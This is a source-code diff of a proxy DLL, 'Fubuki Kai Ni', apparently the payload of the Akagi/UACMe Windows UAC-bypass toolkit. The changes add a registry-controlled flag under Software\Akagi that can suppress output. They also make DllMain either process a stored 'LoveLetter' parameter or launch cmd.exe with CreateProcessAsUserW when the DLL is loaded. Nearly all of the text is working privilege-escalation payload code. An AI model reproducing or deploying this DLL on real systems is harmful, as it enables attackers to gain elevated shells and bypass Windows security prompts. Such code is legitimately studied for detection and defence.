@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2014 - 2016
+*  (C) COPYRIGHT AUTHORS, 2014 - 2017
 *
 *  TITLE:       DLLMAIN.C
 *
-*  VERSION:     2.10
+*  VERSION:     2.53
 *
-*  DATE:        16 Apr 2016
+*  DATE:        18 Jan 2017
 *
 *  Proxy dll entry point, Fubuki Kai Ni.
 *
@@ -33,6 +33,7 @@
 #include <ntstatus.h>
 #include "..\shared\minirtl.h"
 #include "unbcl.h"
+#include "wbemcomn.h"
 
 #if (_MSC_VER >= 1900) 
 #ifdef _DEBUG
@@ -45,6 +46,15 @@
 
 #define T_AKAGI_KEY    L"Software\\Akagi"
 #define T_AKAGI_PARAM  L"LoveLetter"
+#define T_AKAGI_FLAG   L"Flag"
+
+//default execution flow
+#define AKAGI_FLAG_KILO  0
+
+//suppress all additional output
+#define AKAGI_FLAG_TANGO 1
+
+DWORD g_AkagiFlag;
 
 /*
 * DummyFunc
@@ -56,10 +66,9 @@
 */
 VOID WINAPI DummyFunc(
     VOID
-)
+    )
 {
 }
-
 
 /*
 * ucmShowProcessIntegrityLevel
@@ -71,7 +80,7 @@ VOID WINAPI DummyFunc(
 */
 void ucmShowProcessIntegrityLevel(
     VOID
-)
+    )
 {
     NTSTATUS status;
     HANDLE hToken;
@@ -144,7 +153,7 @@ BOOL ucmQueryCustomParameter(
     HKEY                    hKey = NULL;
     LPWSTR                  lpParameter = NULL;
     LRESULT                 lRet;
-    DWORD                   dwSize = 0;
+    DWORD                   dwSize = 0, dwType, dwFlag = 0;
     STARTUPINFOW            startupInfo;
     PROCESS_INFORMATION     processInfo;
 
@@ -154,6 +163,16 @@ BOOL ucmQueryCustomParameter(
             break;
         }
 
+        g_AkagiFlag = AKAGI_FLAG_KILO;
+
+        dwType = REG_DWORD;
+        dwSize = sizeof(DWORD);
+        lRet = RegQueryValueExW(hKey, T_AKAGI_FLAG, NULL, &dwType, (LPBYTE)&dwFlag, &dwSize);
+        if (lRet == ERROR_SUCCESS) {
+            g_AkagiFlag = dwFlag;
+        }
+
+        dwSize = 0;
         lRet = RegQueryValueExW(hKey, T_AKAGI_PARAM, NULL, NULL, (LPBYTE)NULL, &dwSize);
         if (lRet != ERROR_SUCCESS) {
             break;
@@ -204,7 +223,7 @@ BOOL ucmQueryCustomParameter(
 *
 * Purpose:
 *
-* Proxy dll entry point, start cmd.exe and exit immediatelly.
+* Proxy dll entry point, process parameter if exist or start cmd.exe and exit immediatelly.
 *
 */
 BOOL WINAPI DllMain(
@@ -230,8 +249,8 @@ BOOL WINAPI DllMain(
             RtlSecureZeroMemory(&startupInfo, sizeof(startupInfo));
             RtlSecureZeroMemory(&processInfo, sizeof(processInfo));
             startupInfo.cb = sizeof(startupInfo);
-            GetStartupInfoW(&startupInfo);
-
+            GetStartupInfoW(&startupInfo);         
+            
             RtlSecureZeroMemory(sysdir, sizeof(sysdir));
             cch = ExpandEnvironmentStrings(TEXT("%systemroot%\\system32\\"), sysdir, MAX_PATH);
             if ((cch != 0) && (cch < MAX_PATH)) {
@@ -239,12 +258,15 @@ BOOL WINAPI DllMain(
                 _strcpy(cmdbuf, sysdir);
                 _strcat(cmdbuf, TEXT("cmd.exe"));
 
-                if (CreateProcessW(cmdbuf, NULL, NULL, NULL, FALSE, 0, NULL,
+                if (CreateProcessAsUserW(NULL, cmdbuf, NULL, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL,
                     sysdir, &startupInfo, &processInfo))
                 {
                     CloseHandle(processInfo.hProcess);
                     CloseHandle(processInfo.hThread);
-                    ucmShowProcessIntegrityLevel();
+
+                    if (g_AkagiFlag == AKAGI_FLAG_KILO) {
+                        ucmShowProcessIntegrityLevel();
+                    }
                 }
             }
 
